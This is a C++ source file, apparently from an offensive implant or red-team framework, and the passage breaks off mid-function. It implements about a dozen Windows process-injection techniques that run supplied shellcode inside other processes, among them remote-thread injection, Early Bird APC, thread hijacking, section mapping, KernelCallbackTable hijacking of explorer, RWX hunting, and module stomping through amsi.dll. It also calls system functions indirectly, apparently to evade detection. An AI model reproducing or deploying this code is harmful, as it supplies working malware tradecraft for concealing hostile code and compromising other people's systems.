#include "core/technique.hpp"

namespace Technique::Injection::Helper
{
    FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
    {
        if (hModule == NULL || lpProcName == NULL)
            return NULL;

        PIMAGE_NT_HEADERS ntHeaders = RVA(PIMAGE_NT_HEADERS, hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
        PIMAGE_DATA_DIRECTORY dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!dataDir->Size)
            return NULL;

        PIMAGE_EXPORT_DIRECTORY exportDir = RVA(PIMAGE_EXPORT_DIRECTORY, hModule, dataDir->VirtualAddress);
        if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
            return NULL;

        PDWORD expName = RVA(PDWORD, hModule, exportDir->AddressOfNames);
        PWORD expOrdinal = RVA(PWORD, hModule, exportDir->AddressOfNameOrdinals);
        LPCSTR expNameStr;

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++) {

            expNameStr = RVA(LPCSTR, hModule, *expName);

            if (!expNameStr)
                break;

            if (!_stricmp(lpProcName, expNameStr)) {
                DWORD funcRva = *RVA(PDWORD, hModule, exportDir->AddressOfFunctions + (*expOrdinal * 4));
                return RVA(FARPROC, hModule, funcRva);
            }
        }

        return NULL;
    }
}

namespace Technique::Injection
{
    BOOL ShellcodeInjection(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {
        HANDLE hProcess;
        HANDLE hThread;
        LPVOID lpRemoteBuffer;

        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!lpRemoteBuffer)
        {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBuffer,
            lpBuffer,
            dwBufferSize,
            NULL
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Set PAGE_EXECUTE_READWRITE protection.
        DWORD dwOldProtect = PAGE_READWRITE;
        if (!System::Process::VirtualMemoryProtect(
            pProcs,
            hProcess,
            &lpRemoteBuffer,
            &dwBufferSize,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (LPTHREAD_START_ROUTINE)lpRemoteBuffer,
            NULL
        );
        if (!hThread)
        {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr);

        System::Handle::HandleClose(pProcs, hProcess);
        System::Handle::HandleClose(pProcs, hThread);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
    BOOL ShellcodeExecutionViaFibers(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        // Convert the current thread into a fiber.
        PVOID mainFiber = pProcs->lpConvertThreadToFiber(nullptr);

        LPVOID scAddr = pProcs->lpVirtualAlloc(
            NULL,
            dwBufferSize,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        memcpy(scAddr, lpBuffer, dwBufferSize);

        PVOID scFiber = pProcs->lpCreateFiber(0, (LPFIBER_START_ROUTINE)scAddr, NULL);
        pProcs->lpSwitchToFiber(scFiber);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
    BOOL ShellcodeExecutionViaAPCAndNtTestAlert(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        using MY_NTSTATUS = NTSTATUS(NTAPI*)();

        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        MY_NTSTATUS testAlert = (MY_NTSTATUS)(pProcs->lpGetProcAddress(
            pProcs->lpGetModuleHandleA("ntdll"),
            "NtTestAlert"
        ));

        LPVOID scAddr = pProcs->lpVirtualAlloc(nullptr, dwBufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        pProcs->lpWriteProcessMemory(NtCurrentProcess(), scAddr, lpBuffer, dwBufferSize, nullptr);

        PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)scAddr;
        pProcs->lpQueueUserAPC((PAPCFUNC)apcRoutine, NtCurrentThread(), 0);
        testAlert();

        return TRUE;
    }

    BOOL EarlyBirdAPCQueueCodeInjection(
        Procs::PPROCS pProcs,
        const std::wstring& wTargetProcess,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};

        if (!pProcs->lpCreateProcessW(
            nullptr,
            const_cast<LPWSTR>(wTargetProcess.c_str()),
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            nullptr,
            &si,
            &pi
        )) {
            return FALSE;
        }

        HANDLE hProcess = pi.hProcess;
        HANDLE hThread = pi.hThread;

        LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpBaseAddr)
        {
            pProcs->lpCloseHandle(hThread);
            pProcs->lpCloseHandle(hProcess);
            return FALSE;
        }

        PTHREAD_START_ROUTINE  apcRoutine = (PTHREAD_START_ROUTINE)lpBaseAddr;

        if (System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpBaseAddr,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            pProcs->lpQueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);
            pProcs->lpResumeThread(hThread);
        }

        pProcs->lpCloseHandle(hThread);
        pProcs->lpCloseHandle(hProcess);

        return TRUE;
    }

    BOOL ShellcodeExecutionViaCreateThreadpoolWait(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        HANDLE hEvent = pProcs->lpCreateEventW(nullptr, FALSE, TRUE, nullptr);
        if (!hEvent)
        {
            return FALSE;
        }

        LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            NtCurrentProcess(),
            nullptr,
            dwBufferSize,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpBaseAddr)
        {
            System::Handle::HandleClose(pProcs, hEvent);
            return FALSE;
        }

        RtlMoveMemory(lpBaseAddr, lpBuffer, dwBufferSize);

        PTP_WAIT pThreadPoolWait = pProcs->lpCreateThreadpoolWait((PTP_WAIT_CALLBACK)lpBaseAddr, nullptr, nullptr);
        if (!pThreadPoolWait)
        {
            System::Handle::HandleClose(pProcs, hEvent);
            return FALSE;
        }

        pProcs->lpSetThreadpoolWait(pThreadPoolWait, hEvent, nullptr);
        System::Handle::HandleWait(pProcs, hEvent, FALSE, nullptr);

        System::Process::VirtualMemoryFree(
            pProcs,
            NtCurrentProcess(),
            &lpBaseAddr,
            0,
            MEM_RELEASE
        );
        System::Handle::HandleClose(pProcs, hEvent);

        return TRUE;
    }

    BOOL ThreadExecutionHijacking(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;

        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);

        HANDLE hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpBaseAddr)
        {
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpBaseAddr,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &lpBaseAddr,
                0,
                MEM_RELEASE
            );
            return FALSE;
        }

        HANDLE hSnap = pProcs->lpCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        Thread32First(hSnap, &te32);

        HANDLE hThread;
        while (Thread32Next(hSnap, &te32))
        {
            if (te32.th32OwnerProcessID == dwPID)
            {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                break;
            }
        }

        if (SuspendThread(hThread) == -1)
        {
            return FALSE;
        }

        if (!GetThreadContext(hThread, &context))
        {
            return FALSE;
        }
        if (!SetThreadContext(hThread, &context))
        {
            return FALSE;
        }
        if (!ResumeThread(hThread) == -1)
        {
            return FALSE;
        }

        return TRUE;
    }

    // Reference:
    // https://cocomelonc.github.io/tutorial/2021/12/13/malware-injection-12.html
    BOOL ShellcodeExecutionViaMemorySections(
        Procs::PPROCS pProcs,
        DWORD dwTargetPID,
        const std::vector<BYTE>& bytes
    ) {
        NTSTATUS status;

        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        // Create a memory section
        HANDLE hSection;
        SIZE_T dwSize = 4096;
        LARGE_INTEGER maxSize = {dwSize};
        status = CallSysInvoke(
            &pProcs->sysNtCreateSection,
            pProcs->lpNtCreateSection,
            &hSection,
            SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
            nullptr,
            (PLARGE_INTEGER)&maxSize,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            nullptr
        );
        if (status != STATUS_SUCCESS)
        {
            return FALSE;
        }

        // Bind the object in the memory of the current process for reading and writing.
        PVOID pLocalBuffer;
        PVOID pRemoteBuffer;
        status = CallSysInvoke(
            &pProcs->sysNtMapViewOfSection,
            pProcs->lpNtMapViewOfSection,
            hSection,
            NtCurrentProcess(),
            &pLocalBuffer,
            0,
            0,
            nullptr,
            &dwSize,
            Nt::ViewUnmap,
            0,
            PAGE_READWRITE
        );
        if (status != STATUS_SUCCESS)
        {
            System::Handle::HandleClose(pProcs, hSection);
            return FALSE;
        }

        // Open target process
        HANDLE hTargetProcess = System::Process::ProcessOpen(
            pProcs,
            dwTargetPID,
            PROCESS_ALL_ACCESS
        );
        if (!hTargetProcess)
        {
            System::Handle::HandleClose(pProcs, hSection);
            return FALSE;
        }

        // Bind the object in the memory of the target process for reading and executing.
        status = CallSysInvoke(
            &pProcs->sysNtMapViewOfSection,
            pProcs->lpNtMapViewOfSection,
            hSection,
            hTargetProcess,
            &pRemoteBuffer,
            0,
            0,
            nullptr,
            &dwSize,
            Nt::ViewUnmap,
            0,
            PAGE_EXECUTE_READ
        );
        if (status != STATUS_SUCCESS)
        {
            System::Handle::HandleClose(pProcs, hSection);
            System::Handle::HandleClose(pProcs, hTargetProcess);
            return FALSE;
        }

        memcpy(pLocalBuffer, lpBuffer, dwBufferSize);

        HANDLE hThread;
        CallSysInvoke(
            &pProcs->sysRtlCreateUserThread,
            pProcs->lpRtlCreateUserThread,
            hTargetProcess,
            nullptr,
            FALSE,
            0,
            0,
            0,
            (Nt::PUSER_THREAD_START_ROUTINE)pRemoteBuffer,
            nullptr,
            &hThread,
            nullptr
        );
        if (status != STATUS_SUCCESS)
        {
            System::Handle::HandleClose(pProcs, hSection);
            System::Handle::HandleClose(pProcs, hTargetProcess);
            return FALSE;
        }

        if (!System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr))
        {
            System::Handle::HandleClose(pProcs, hSection);
            System::Handle::HandleClose(pProcs, hTargetProcess);
            System::Handle::HandleClose(pProcs, hThread);
            return FALSE;
        }

        // Cleanup
        CallSysInvoke(
            &pProcs->sysNtUnmapViewOfSection,
            pProcs->lpNtUnmapViewOfSection,
            NtCurrentProcess(),
            pLocalBuffer
        );
        CallSysInvoke(
            &pProcs->sysNtUnmapViewOfSection,
            pProcs->lpNtUnmapViewOfSection,
            hTargetProcess,
            pLocalBuffer
        );
        System::Handle::HandleClose(pProcs, hSection);
        System::Handle::HandleClose(pProcs, hTargetProcess);

        return TRUE;
    }

    BOOL ShellcodeExecutionViaFindWindow(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        HWND hWindow = pProcs->lpFindWindowW(L"Shell_TrayWnd", nullptr);
        if (!hWindow)
            return FALSE;

        DWORD dwPID;
        if (pProcs->lpGetWindowThreadProcessId(hWindow, &dwPID) == 0)
        {
            System::Handle::HandleClose(pProcs, hWindow);
            return FALSE;
        }

        HANDLE hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            System::Handle::HandleClose(pProcs, hWindow);
            return FALSE;
        }

        LPVOID lpRemoteBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpRemoteBaseAddr)
        {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBaseAddr,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        HANDLE hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (LPTHREAD_START_ROUTINE)lpRemoteBaseAddr,
            nullptr
        );
      
        System::Handle::HandleClose(pProcs, hWindow);
        System::Handle::HandleClose(pProcs, hProcess);

        return TRUE;
    }

    // Reference:
    // https://cocomelonc.github.io/tutorial/2022/01/24/malware-injection-15.html
    BOOL ShellcodeExecutionViaKernelContextTable(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        // Find a window for explorer.exe
        HWND hWindow = pProcs->lpFindWindowW(L"Shell_TrayWnd", nullptr);
        if (!hWindow)
            return FALSE;

        DWORD dwPID;
        if (pProcs->lpGetWindowThreadProcessId(hWindow, &dwPID) == 0)
        {
            System::Handle::HandleClose(pProcs, hWindow);
            return FALSE;
        }

        HANDLE hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            System::Handle::HandleClose(pProcs, hWindow);
            return FALSE;
        }

        Nt::PROCESS_BASIC_INFORMATION pbi;
        NTSTATUS status = CallSysInvoke(
            &pProcs->sysNtQueryInformationProcess,
            pProcs->lpNtQueryInformationProcess,
            hProcess,
            Nt::ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            nullptr
        );
        if (status != STATUS_SUCCESS)
        {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        Nt::PEB peb;
        if (!System::Process::VirtualMemoryRead(
            pProcs,
            hProcess,
            pbi.PebBaseAddress,
            &peb,
            sizeof(peb),
            nullptr
        )) {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        Nt::KERNELCALLBACKTABLE_T kct;
        if (!System::Process::VirtualMemoryRead(
            pProcs,
            hProcess,
            peb.KernelCallbackTable,
            &kct,
            sizeof(kct),
            nullptr
        )) {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        LPVOID lpRemoteBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpRemoteBaseAddr)
        {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }
        
        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBaseAddr,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        LPVOID lpTableBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            sizeof(kct),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!lpTableBaseAddr)
        {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }
        kct.__fnCOPYDATA = (ULONG_PTR)lpRemoteBaseAddr;
        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpTableBaseAddr,
            &kct,
            sizeof(kct),
            nullptr
        )) {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Update the PEB
        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            (PBYTE)pbi.PebBaseAddress + offsetof(Nt::PEB, KernelCallbackTable),
            &lpTableBaseAddr,
            sizeof(ULONG_PTR),
            nullptr
        )) {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        COPYDATASTRUCT cds;
        WCHAR wMsg[] = L"Hello";
        cds.dwData = 1;
        cds.cbData = lstrlen(wMsg) * 2;
        cds.lpData = wMsg;

        SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            (PBYTE)pbi.PebBaseAddress + offsetof(Nt::PEB, KernelCallbackTable),
            &peb.KernelCallbackTable,
            sizeof(ULONG_PTR),
            nullptr
        )) {
            System::Handle::HandleClose(pProcs, hWindow);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Cleanup
        System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBaseAddr, 0, MEM_RELEASE);
        System::Process::VirtualMemoryFree(pProcs, hProcess, &lpTableBaseAddr, 0, MEM_RELEASE);
        System::Handle::HandleClose(pProcs, hProcess);

        return TRUE;
    }

    BOOL RWXHunting(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        BOOL bResult;
        NTSTATUS status;

        HANDLE hSnapshot = pProcs->lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE)
        {
            return FALSE;
        }

        PROCESSENTRY32 pe = {0};
        pe.dwSize = sizeof(PROCESSENTRY32);

        bResult = pProcs->lpProcess32FirstW(hSnapshot, &pe);
        if (!bResult)
        {
            System::Handle::HandleClose(pProcs, hSnapshot);
            return FALSE;
        }

        HANDLE hProcess;
        HANDLE hThread;
        SIZE_T dwReturnLength = 0;
        LPVOID lpAddr = nullptr;
        MEMORY_BASIC_INFORMATION m;
        BOOL bFound = FALSE;

        while (pProcs->lpProcess32NextW(hSnapshot, &pe))
        {
            hProcess = System::Process::ProcessOpen(
                pProcs,
                pe.th32ProcessID,
                MAXIMUM_ALLOWED
            );
            if (hProcess)
            {
                // Check RWX
                while (pProcs->lpVirtualQueryEx(hProcess, lpAddr, &m, sizeof(m)))
                {
                    lpAddr = (LPVOID)((DWORD_PTR)m.BaseAddress + m.RegionSize);
                    if (m.AllocationProtect == PAGE_EXECUTE_READWRITE)
                    {
                        // RWX found!
                        if (!System::Process::VirtualMemoryWrite(
                            pProcs,
                            hProcess,
                            m.BaseAddress,
                            lpBuffer,
                            dwBufferSize,
                            nullptr
                        )) {
                            break;
                        }

                        hThread = System::Process::RemoteThreadCreate(
                            pProcs,
                            hProcess,
                            (LPTHREAD_START_ROUTINE)m.BaseAddress,
                            nullptr
                        );
                        if (!hThread)
                        {
                            break;
                        }

                        System::Handle::HandleWait(
                            pProcs,
                            hThread,
                            FALSE,
                            nullptr
                        );

                        break;
                    }
                }

                lpAddr = nullptr;
            }
        }

        System::Handle::HandleClose(pProcs, hSnapshot);
        System::Handle::HandleClose(pProcs, hProcess);

        return TRUE;
    }

    BOOL AddressOfEntryPointInjection(
        Procs::PPROCS pProcs,
        const std::wstring& wTargetProcess,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        STARTUPINFOW si;
        PROCESS_INFORMATION pi;

        if (!CreateProcessW(
            nullptr,
            const_cast<LPWSTR>(wTargetProcess.c_str()),
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            nullptr,
            &si,
            &pi
        )) {
            return FALSE;
        }

        HANDLE hProcess = pi.hProcess;
        HANDLE hThread = pi.hThread;

        Nt::PROCESS_BASIC_INFORMATION pbi;
        DWORD dwReturnLength = 0;

        // Get target image PEB address and pointer to image base.
        NTSTATUS status = CallSysInvoke(
            &pProcs->sysNtQueryInformationProcess,
            pProcs->lpNtQueryInformationProcess,
            hProcess,
            Nt::ProcessBasicInformation,
            &pbi,
            sizeof(Nt::PROCESS_BASIC_INFORMATION),
            &dwReturnLength
        );
        if (status != STATUS_SUCCESS)
        {
            return FALSE;
        }

        #ifdef _WIN64
	        DWORD_PTR dwPebOffset = (DWORD_PTR)pbi.PebBaseAddress + 0x10;
        #else
            DWORD_PTR dwPebOffset = (DWORD_PTR)pbi.PebBaseAddress + 8;
        #endif

        // Get target process image base address.
        LPVOID lpImageBase;
        SIZE_T dwBytesRead;

        #ifdef _WIN64
            if (!System::Process::VirtualMemoryRead(
                pProcs,
                hProcess,
                (PVOID)dwPebOffset,
                &lpImageBase,
                sizeof(PVOID), 
                &dwBytesRead
            )) {
                return FALSE;
            }
        #else
            if (!System::Process::VirtualMemoryRead(
                pProcs,
                hProcess,
                (PVOID)dwPebOffset,
                &lpImageBase,
                sizeof(PVOID),
                &dwBytesRead
            )) {
                return FALSE;
            }
        #endif

        // Read target process image headers
        BYTE headersBuffer[4096] = {};
        if (!System::Process::VirtualMemoryRead(
            pProcs,
            hProcess,
            (PVOID)lpImageBase,
            headersBuffer,
            4096,
            nullptr
        )) {
            return FALSE;
        }

        // Get AddressOfEntryPoint
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + pDosHeader->e_lfanew);
        LPVOID lpCodeEntry = (LPVOID)((LPBYTE)lpImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

        // Write shellcode to image entry point and execute it.
        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpCodeEntry,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            return FALSE;
        }

        if (ResumeThread(hThread) == -1)
        {
            return FALSE;
        }

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
    BOOL ModuleStomping(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        HANDLE hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        wchar_t wModuleToInject[] = L"C:\\windows\\system32\\amsi.dll";

        LPVOID lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            sizeof(wModuleToInject),
            MEM_COMMIT,
            PAGE_READWRITE
        );
        if (!lpRemoteBuffer)
        {
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBuffer,
            (LPVOID)wModuleToInject,
            sizeof(wModuleToInject),
            nullptr
        )) {
            return FALSE;
        }

        PTHREAD_START_ROUTINE pThreadRoutine = (PTHREAD_START_ROUTINE)pProcs->lpGetProcAddress(
            pProcs->lpGetModuleHandleA("Kernel32"),
            "LoadLibraryW"
        );

        HANDLE hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            pThreadRoutine,
            lpRemoteBuffer
        );
        if (!hThread)
        {
            return FALSE;
        }
        if (!System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr))
        {
            return FALSE;
        }

        // Find base address of the injected benign DLL in remote process.
        HMODULE modules[256] = {};
        SIZE_T dwModulesSize = sizeof(modules);
        DWORD dwModulesSizeNeeded = 0;
        DWORD dwModuleNameSize = 0;

        EnumProcessModules(hProcess, modules, dwModulesSize, &dwModulesSizeNeeded);
        SIZE_T dwModulesCount = dwModulesSizeNeeded / sizeof(HMODULE);
        HMODULE hRemoteModule;
        CHAR sRemoteModuleName[128] = {};
        for (size_t i = 0; i < dwModulesCount; i++)
        {
            hRemoteModule = modules[i];
            if (GetModuleBaseNameA(hProcess, hRemoteModule, sRemoteModuleName, sizeof(sRemoteModuleName)) != 0)
            {
                if (std::string(sRemoteModuleName).compare("amsi.dll") == 0)
                {
                    break;
                }
            }
        }

        if (!hRemoteModule)
        {
            return FALSE;
        }

        // Get DLL's AddressOfEntryPoint
        DWORD dwHeaderBufferSize = 0x1000;
        LPVOID lpTargetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwHeaderBufferSize);
        if (!System::Process::VirtualMemoryRead(
            pProcs,
            hProcess,
            hRemoteModule,
            lpTargetProcessHeaderBuffer,
            dwHeaderBufferSize,
            nullptr
        )) {
            return FALSE;
        }

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpTargetProcessHeaderBuffer;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpTargetProcessHeaderBuffer + pDosHeader->e_lfanew);
        LPVOID lpDllEntryPoint = (LPVOID)(pNtHeaders->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hRemoteModule);

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpDllEntryPoint,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            return FALSE;
        }

        // Execute shellcode from inside the benigh DLl
        if (!System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (PTHREAD_START_ROUTINE)lpDllEntryPoint,
            nullptr
        )) {
            return FALSE;
        }

        return TRUE;
    }

    // Reference:
    // https://github.com/deepinstinct/Dirty-Vanity
    // This is required to reflective shellcode.
    BOOL DirtyVanity(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {
        MessageBox(NULL, L"Start", L"DirtyVanity", MB_OK);

        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        // HANDLE hProcess = System::Process::ProcessOpen(
        //     pProcs,
        //     dwPID,
        //     PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE
        // );
        HANDLE hProcess = pProcs->lpOpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
            TRUE,
            dwPID
        );
        if (!hProcess)
        {
            return FALSE;
        }

        MessageBox(NULL, L"Start", L"OpenProcess OK", MB_OK);

        LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpBaseAddr)
        {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        MessageBox(NULL, L"Start", L"VirtualMemoryAllocate", MB_OK);

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpBaseAddr,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        MessageBox(NULL, L"Start", L"VirtualMemoryWrite", MB_OK);

        Nt::RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = {0};
        NTSTATUS status = CallSysInvoke(
            &pProcs->sysRtlCreateProcessReflection,
            pProcs->lpRtlCreateProcessReflection,
            hProcess,
